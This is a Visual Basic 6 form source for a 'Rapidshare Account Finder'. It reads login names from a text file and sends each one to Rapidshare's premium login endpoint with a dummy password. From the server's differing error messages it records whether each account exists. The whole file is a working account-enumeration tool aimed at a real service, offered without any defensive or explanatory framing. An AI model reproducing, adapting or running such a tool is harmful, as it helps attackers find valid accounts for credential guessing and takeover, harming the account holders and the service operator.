VERSION 5.00
Object = "{48E59290-9880-11CF-9754-00AA00C00908}#1.0#0"; "MSINET.OCX"
Object = "{831FDD16-0C5C-11D2-A9FC-0000F8754DA1}#2.0#0"; "MSCOMCTL.OCX"
Begin VB.Form Rapidshare 
   Caption         =   "Rapidshare Account Finder"
   ClientHeight    =   4965
   ClientLeft      =   60
   ClientTop       =   345
   ClientWidth     =   5100
   LinkTopic       =   "Form1"
   ScaleHeight     =   4965
   ScaleWidth      =   5100
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton LoadAccounts 
      Caption         =   "Load Accounts"
      Height          =   495
      Left            =   120
      TabIndex        =   0
      Top             =   120
      Width           =   4875
   End
   Begin VB.CommandButton Check 
      Caption         =   "Check"
      Height          =   495
      Left            =   120
      TabIndex        =   2
      Top             =   4320
      Width           =   4875
   End
   Begin InetCtlsObjects.Inet Inet1 
      Left            =   5040
      Top             =   600
      _ExtentX        =   1005
      _ExtentY        =   1005
      _Version        =   393216
   End
   Begin MSComctlLib.ListView lvAccounts 
      Height          =   2895
      Left            =   120
      TabIndex        =   3
      Top             =   720
      Width           =   4875
      _ExtentX        =   8599
      _ExtentY        =   5106
      View            =   3
      LabelWrap       =   -1  'True
      HideSelection   =   -1  'True
      FullRowSelect   =   -1  'True
      GridLines       =   -1  'True
      _Version        =   393217
      ForeColor       =   -2147483640
      BackColor       =   -2147483643
      BorderStyle     =   1
      Appearance      =   1
      NumItems        =   2
      BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         Text            =   "Login"
         Object.Width           =   2540
      EndProperty
      BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
         SubItemIndex    =   1
         Text            =   "Result"
         Object.Width           =   2540
      EndProperty
   End
   Begin VB.Label Label1 
      Appearance      =   0  'Flat
      BackColor       =   &H00E0E0E0&
      BorderStyle     =   1  'Fixed Single
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H000000FF&
      Height          =   495
      Left            =   120
      TabIndex        =   1
      Top             =   3720
      Width           =   4875
   End
End
Attribute VB_Name = "Rapidshare"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Check_Click()
Dim i As Integer
Dim SURL As String
For i = 1 To lvAccounts.ListItems.Count
    SURL = "http://rapidshare.com/cgi-bin/premium.cgi?accountid=" & lvAccounts.ListItems.Item(i) & "&password=123456789&premiumlogin=1"
    Account = Rapidshare.Inet1.OpenURL(SURL)
    If InStr(Account, "The Account has been found, but the password is incorrect.") Then
        Label1.Caption = "The Account has been found, but the password is incorrect."
        lvAccounts.ListItems.Item(i).SubItems(1) = "Found"
    End If
    If InStr(Account, "Your Premium Account has not been found.") Then
        Label1.Caption = "Your Premium Account has not been found."
        lvAccounts.ListItems.Item(i).SubItems(1) = "Not Found"
    End If
Next i
End Sub
Private Sub LoadAccounts_Click()
Programme = "accounts.txt"
Open Programme For Input Lock Read As #1
taille_o = LOF(1)
taille = taille_o / 1000
Do While Not EOF(1)
    Input #1, ligne
    With lvAccounts.ListItems.Add(, , ligne)
        .SubItems(1) = "Not Checked"
    End With
Loop
Close #1
End Sub
